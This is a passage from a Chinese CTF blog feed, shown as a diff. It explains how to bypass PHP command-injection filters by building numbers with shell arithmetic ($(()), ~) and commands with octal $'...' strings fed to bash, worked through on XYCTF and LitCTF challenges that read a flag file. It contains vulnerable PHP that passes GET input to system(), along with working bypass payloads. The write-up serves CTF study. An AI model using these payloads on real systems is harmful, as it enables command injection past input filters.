+<h5 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h5><h6 id="XYCTF-2024-ezRCE"><a href="#XYCTF-2024-ezRCE" class="headerlink" title="XYCTF 2024 - ezRCE"></a>XYCTF 2024 - ezRCE</h6><p>题目源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">really ez?</span><br></pre></td></tr></table></figure>
+
+<p>就是考的八进制数据，没有禁<code>&#39;</code>，先尝试直接<code>ls</code>，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\154\163&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603180726080.png" alt="image-20240603180726080"></p>
+<p>读取根目录（<code>ls /</code>），可以如下构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls / ==&gt;$&#x27;\154\163\40\57&#x27;</span><br><span class="line">$0&lt;&lt;&lt;\$0\&lt;\&lt;\&lt;\$\&#x27;\\154\\163\\40\\57\&#x27;</span><br><span class="line">防止转义</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603180945707.png" alt="image-20240603180945707"></p>
+<p>最后读flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /f*</span><br><span class="line">$0&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\52&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>读到flag</p>
+<p>但是正如常用的<code>bash&lt;&lt;&lt;...</code>这道题还可以尝试构造<code>bash</code>，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\142\141\163\150&#x27;&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\52&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>也可以成功读到flag。</p>
+<p>注意知识点的融汇贯通。</p>
+<p>其他的题可以看看</p>
+<p><a href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc">CTFshow-周末大挑战官方wp</a></p>
+]]></content>
+      <categories>
+        <category>rce</category>
+        <category>rce之利用shell变量</category>
+      </categories>
+  </entry>
+  <entry>
     <title>python沙箱逃逸</title>
     <url>/2024/06/02/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
     <content><![CDATA[<p>沙箱是一种安全机制，用于在受限制的环境中运行未信任的程序或代码。它的主要目的是防止这些程序或代码影响宿主系统或者访问未授权的数据。</p>
@@ -2013,321 +2581,6 @@
       <categories>
         <category>Python漏洞</category>
         <category>python沙箱逃逸</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>rce之利用shell变量</title>
-    <url>/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/</url>
-    <content><![CDATA[<h3 id="rce-‘新’进阶"><a href="#rce-‘新’进阶" class="headerlink" title="rce ‘新’进阶"></a>rce ‘新’进阶</h3><p>现在稍微大型的比赛都不会考那些已经算是比较常见、常用、简单的绕过如简单的取反、自增等，需要进阶学习纪录一下。此为学习者笔记,还是<strong>强调知识点融会贯通</strong></p>
-<span id="more"></span>
-
-<h3 id="命令执行之构造数字"><a href="#命令执行之构造数字" class="headerlink" title="命令执行之构造数字"></a>命令执行之构造数字</h3><h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h5><p><strong>在linux中<code>$(())</code>用于算术运算</strong>，在这个表达式中，你可以放入任何想要计算的运算式。</p>
-<p>先看下面这个式子：</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602213327932.png" alt="image-20240602213327932"></p>
-<p>这个式子中并没有给出任何具体的运算内容，系统默认执行了一个空的算数运算。所以在没有明确运算目标的情况下，**<code>$(())</code>返回的默认值是0**。（同时注意，个人认为，注意看payload以及执行情况，<code>$(())</code>本生就会执行后返回结果，不需要套一个<code>eval()</code>这种类似的执行函数）</p>
-<p>看看给了的正常的运算符</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214355554.png" alt="image-20240602214355554"></p>
-<p>重点来了，尝试将上面那个0取反<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214522539.png" alt="image-20240602214522539"></p>
-<p>得到-1，那么再取反一次<code>-2</code>看看<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214739811.png" alt="image-20240602214739811"></p>
-<p>这里又得到了1，linux中的取反操作时针对二进制进行的，那么现在就可以通过相加减获得数字。</p>
-<p>比如想要获得1，就可以像上面一样构造，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $((~$(($((~$(())))+$((~$(())))))))</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602215641095.png" alt="image-20240602215641095"></p>
-<p>现在想要构造就很简单了，比如又想构造<code>2</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $(($((~$(($((~$(())))+$((~$(())))))))+$((~$(($((~$(())))+$((~$(())))))))))</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602215758986.png" alt="image-20240602215758986"></p>
-<p>这样就可以构造任意数字。</p>
-<p><strong>同时注意加号在某些情况下可以省略</strong>（建议在去掉+号前先看看没去+号是什么样子的），比如那个生成1的payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原：</span><br><span class="line">echo $((~$(($((~$(())))+$((~$(())))))))</span><br><span class="line"></span><br><span class="line">去掉+号后</span><br><span class="line">echo $((~$(($((~$(())))$((~$(())))))))  如下图</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222226786.png" alt="image-20240602222226786"></p>
-<p>成功执行。</p>
-<p>但是注意，为什么要加某些情况下呢，比如下面这个测试：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $(($((~$(($((~$(())))+$((~$(())))))))+$((~$(($((~$(())))+$((~$(())))))))))</span><br><span class="line">生成2的payload，那么现在将+去掉，如下：</span><br><span class="line">echo $(($((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))))</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222408309.png" alt="image-20240602222408309"></p>
-<p>这里生成的却是11，嘿嘿，这是怎么回事，注意看这个payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(($((~$(($((~$(())))+$((~$(())))))))+$((~$(($((~$(())))+$((~$(())))))))))</span><br><span class="line"></span><br><span class="line">先像上面那个1那样只去掉构造出1的+号，再看看执行结果，如下：</span><br><span class="line">$(($((~$(($((~$(())))$((~$(())))))))+$((~$(($((~$(())))$((~$(())))))))))</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222634293.png" alt="image-20240602222634293"></p>
-<p>成功得到2，那么为什么将中间那个<code>+</code>去掉就不对了呢，个人认为是符号判定的问题，用代码表示一下去掉<code>+</code>后的情况：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(( $((~$(($((~$(())))$((~$(()))))))) $((~$(($((~$(())))$((~$(()))))))) ))</span><br></pre></td></tr></table></figure>
-
-<p>用空格分隔了一下，注意看</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))))))  已经符合一个完整的格式，会得到1，那么两个1就会得到11，这就是为什么可以得到11的原因</span><br></pre></td></tr></table></figure>
-
-<p>那么现在来和之前生成1的payload对比一下（同样用空格分隔）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(( ~$(($((~$(()))) $((~$(()))))) ))</span><br></pre></td></tr></table></figure>
-
-<p>这样并不能形成一个完整的可计算的格式，故只能类似之前那样有个<code>+</code>，所以这里的<code>+</code>号可以省略，而那个2不能。</p>
-<p><strong>那么如果遇到过滤<code>+</code>号的题</strong>，2该如何构造呢，注意看：</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602223600280.png" alt="image-20240602223600280"></p>
-<p>尝试一下构造<code>-3</code>，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1: $((~$(())))</span><br><span class="line"></span><br><span class="line">echo $((~$(($((~$(())))+$((~$(())))+$((~$(())))))))</span><br><span class="line">可以直接得到2，看了一下构造，应该是可以去掉+号的，尝试一下：</span><br><span class="line">echo $((~$(($((~$(())))$((~$(())))$((~$(()))))))) ,成功</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602223942848.png" alt="image-20240602223942848"></p>
-<p>多尝试，看构造，较重要</p>
-<h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><p>LitCTF2024 - 百万美元的诱惑</p>
-<p>开题：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> !== <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> &gt; <span class="number">2024</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;好康的&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;干巴爹干巴爹先辈~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;开胃小菜))&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>简单的绕过，payload如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a[]=1&amp;b[]=2&amp;c=2025a</span><br></pre></td></tr></table></figure>
-
-<p>然后给了第二关<code>/dollar.php</code>，代码如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in 12.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$x</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z0-9;`|#&#x27;\&quot;%&amp;\x09\x0a&gt;&lt;.,?*\-=\\[\]]/i&quot;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$x</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>正好对应这个知识点，构造如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">刚刚好我在学习时构造出了11，这里直接利用</span><br><span class="line">11+1=12 ： $(($((~$(($((~$(())))$((~$(())))))))+$(($((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))))))</span><br></pre></td></tr></table></figure>
-
-<p>刚好这里没有禁+号，直接抓包后传进去即可</p>
-<h3 id="利用shell脚本变量构造命令"><a href="#利用shell脚本变量构造命令" class="headerlink" title="利用shell脚本变量构造命令"></a>利用shell脚本变量构造命令</h3><p>这个思路最早提出于2017年34c3CTF里的<a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">minbashmaxfun</a>，随后2020安洵杯也有<a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQqOQbDkDfg2TD&alichlgref=https://www.bing.com/#toc-2">Web-Bash-Vino0o0o</a></p>
-<p><strong>探姬师傅有个项目应该是可以尝试一把梭的</strong>，好文好项目推送：<code>https://github.com/ProbiusOfficial/bashFuck?tab=readme-ov-file</code></p>
-<p>还有bash的参考手册：<code>https://www.gnu.org/software/bash/manual/bash.html</code></p>
-<h4 id="启程"><a href="#启程" class="headerlink" title="启程"></a>启程</h4><p>这一板块去跟一下最早的<a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">文章</a>。</p>
-<p><strong>这道题允许的字符串<code>$()#!&#123;&#125;&lt;\’,</code></strong></p>
-<p>这里说明一下相关变量：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）$# -参数数量-单独使用结果为0</span><br><span class="line">（2）$&#123;##&#125; -计数变量（#）长度，这里的结果为1</span><br><span class="line">（3）$((expr)) -算术表达式</span><br><span class="line">（4）&lt;&lt;&lt; -这是Bash shell语言中的重定向符，将一个变量或者字符串重定向到命令的标准输入（即wc -w &lt;&lt;&lt; &quot;H&quot;等价于echo &quot;H&quot; | wc -w）</span><br><span class="line">（5）$&#123;!var&#125; -间接引用</span><br><span class="line">（6）$&#x27;\123&#x27; -将八进制转换为字符串文字中的字符</span><br><span class="line">（7）&#123;a,b&#125; -花括号扩展</span><br></pre></td></tr></table></figure>
-
-<p><strong>这里补充说明一下</strong>：</p>
-<ul>
-<li>对（5）的间接引用的说明，直接给shell测试代码：</li>
-</ul>
-<p>haha.sh:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">var1=&quot;hello&quot;</span><br><span class="line">var2=&quot;var1&quot;</span><br><span class="line">echo $&#123;!var2&#125;</span><br></pre></td></tr></table></figure>
-
-<p>再运行：</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603023300478.png" alt="image-20240603023300478"></p>
-<p>可以看到这里输出的是hello，这就是间接引用的定义。</p>
-<ul>
-<li>对（6）的补充说明，如下：</li>
-</ul>
-<p>一个小小的前置知识，看完理解一下就行。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls ==》 $&#x27;\154&#x27;$&#x27;\163&#x27; 这样是可以直接使用的</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603153444204.png" alt="image-20240603153444204"></p>
-<p>就是<code>$&#39;&#39;</code>会直接执行生成，所以交给编译器的是ls，也就会执行。</p>
-<p><strong>再进行组合运用一下：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;)) - 1左移1，结果为2 位运算，与二进制的运算相关</span><br><span class="line">$&#123;!#&#125; - 执行 bash（因为第一个参数是 /bin/bash），可以在本地输出看看</span><br><span class="line">$((2#100)) -将二进制转换为十进制</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="开始构造"><a href="#开始构造" class="headerlink" title="开始构造"></a>开始构造</h5><p>先尝试<code>ls</code>，**<code>l</code>对应八进制为0154，<code>s</code>对应的八进制为0163。**</p>
-<p><strong>先用八进制表示，<code>$&#39;\154&#39;$&#39;\163&#39;</code>,个人发现<code>$&#39;\154\163&#39;</code>也可以表示<code>ls</code>，</strong>这里先跟文章，然后再尝试自己构造发现的同样表示ls的方法。</p>
-<p>注意组合运用那里<code>$((2#100))</code>可以将二进制100转换为十进制数4，采用这个思路来构造出整数，</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">154二进制数 : 0b10011010</span><br><span class="line">163二进制数 : 0b10100011</span><br></pre></td></tr></table></figure>
-
-<p>那么现在就用<code>$#</code>（0）和<code>$</code>（1）来替换里面的数字，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">154二进制数 ：$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#</span><br><span class="line">163二进制数 ：$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这样就可以构造出二进制的数。</p>
-<p>那么此时就需要构造出前面的2，<strong>此时再看组合运用那里</strong>，<code>$(($&lt;&lt;$))</code>这样不就构造出2了吗，最终效果如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">154：$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))</span><br><span class="line">同理</span><br><span class="line">163：$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))</span><br></pre></td></tr></table></figure>
-
-<p>这时再套入<code>$&#39;&#39;</code>，即（<code>$&#39;\154&#39;$&#39;\163&#39;</code>），如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先看正常包裹：</span><br><span class="line">$&#x27;\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))&#x27;$&#x27;\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))&#x27;</span><br><span class="line">这样并不能成功，请注意。估计就是套外面的特殊符号被当作字符串从而转义了，这里就需要在特殊符号前面加一个\防止被转义。</span><br><span class="line">那么再次尝试如下：</span><br><span class="line">\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\&#x27;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br><span class="line">输出看看</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603125450576.png" alt="image-20240603125450576"></p>
-<p>但是注意，这个构造出来的<code>$&#39;\154&#39;$&#39;\163&#39;</code><strong>只会被当做字符串，并不会被当作命令执行再次执行从而形成ls</strong>，也就是说这里的<code>$&#39;&#39;</code>并没有起作用，本来它可以自己执行从而生成ls的，为什么不继续解析可以看看这个<a href="https://www.freebuf.com/articles/system/361101.html">文章</a>，可以在终端直接传，结果如下：<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603125825756.png" alt="image-20240603125825756"></p>
-<p>显示没有这个命令，那么此时我们就需要将这个传入bash使得这个被解析为<code>ls</code>，<strong>这次就可以利用到<code>&lt;&lt;&lt;</code>这个重定向符</strong>，如下格式：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;&lt;&lt; \$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\&#x27;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>这样就可以成功构造出ls，再传入的时候就可以被执行，但是这道题这里要求无字母，此时就<strong>可以用到间接扩展<code>$0</code>，单独使用在linux中对应bash</strong>，但是这道题不能有数字，看组合运用那里，就可以像这样：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;!#&#125; &lt;&lt;&lt; \$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\&#x27;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>很怪的就是本地测试当中<code>bash&lt;&lt;&lt;.....</code>可以执行，但是<code>$0</code>和<code>$&#123;!#&#125;</code>都不能成功执行，报错如下：</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603135658082.png" alt="image-20240603135658082"></p>
-<p><strong>怪？？？，怎么回事，可能是宝塔linux环境的问题吧，多尝试，注意看题目要求。</strong></p>
-<p>这里再用centos跑一下：</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603204933409.png" alt="image-20240603204933409"></p>
-<p>成功，这样就可以构造出没有数字字母的<code>ls</code>的payload了。</p>
-<p><strong>那么继续深入</strong>，比如读flag（<code>cat /flag</code>）或者查看根目录（<code>ls /</code>），<strong>尝试直接利用</strong>一下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls / ==&gt; $&#x27;\154\163\40\57&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603141433189.png" alt="image-20240603141433189"></p>
-<p>注意看，这里构造出来后被<code>ls /</code>被当作了整个字符串处理，而不是命令，这是怎么回事，<strong>这是因为<code>bash</code>是用空格分隔参数，这个方法（<code>$&#39;&#39;</code>）处理完的结果会导致整个结果都被当做了字符串（包括这里的空格）</strong>，这就导致了不能被正常解析为命令。解决方法如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">要先给bash来参数分离一下，</span><br><span class="line">bash &lt;&lt;&lt; $&#x27;\154\163\40\57&#x27;   </span><br><span class="line">即可成功执行，还有问题的话就如这种格式尝试&#123;ls,/&#125;，注意&#123;ls,/&#125;也不能像之前ls那样直接利用，与ls /同样的问题。</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>再来看看文章的问题</strong></p>
-<p>在传入时有效的做到了以下几点：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&quot;&#x27;ls -l&#x27;&quot;</span><br></pre></td></tr></table></figure>
-
-<p>却报错</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash: line 1: ls -l: command not found</span><br></pre></td></tr></table></figure>
-
-<p>看到这里我测试了一下，如下传参是可以执行的：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&quot;ls /&quot;</span><br></pre></td></tr></table></figure>
-
-<p>我就在想为什么要这样在里面套一对单引号，本来以为是多此一举，想了一下，可能是构造出来的payload在转化完后就是这样的，事实胜于雄辩，直接构造一下看看结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /  ：$&#x27;\154\163\40\57&#x27;  这次这样构造一下</span><br><span class="line">相对应的二进制数为：0b10011010，0b10100011，0b101000 和 0b111001</span><br><span class="line">分别为 $&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$# $&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125; $&#123;##&#125;$#$&#123;##&#125;$#$#$# $&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;</span><br><span class="line">再二进制转十进制，如下：</span><br><span class="line">2:   $(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))</span><br><span class="line">154: $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))</span><br><span class="line">163: $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))</span><br><span class="line">40:  $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#))</span><br><span class="line">57:  $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;))</span><br></pre></td></tr></table></figure>
-
-<p>那么现在如下构造：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先完成最前面提出的问题，试试$&#x27;\154\163&#x27;能不能使用，如下：</span><br><span class="line">\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br><span class="line">结合前面的问题，如下测试：</span><br><span class="line">bash&lt;&lt;&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;  成功执行ls</span><br><span class="line"></span><br><span class="line">同时注意bash&lt;&lt;&lt;&quot;&#x27;ls&#x27;&quot; 也是可以执行的</span><br></pre></td></tr></table></figure>
-
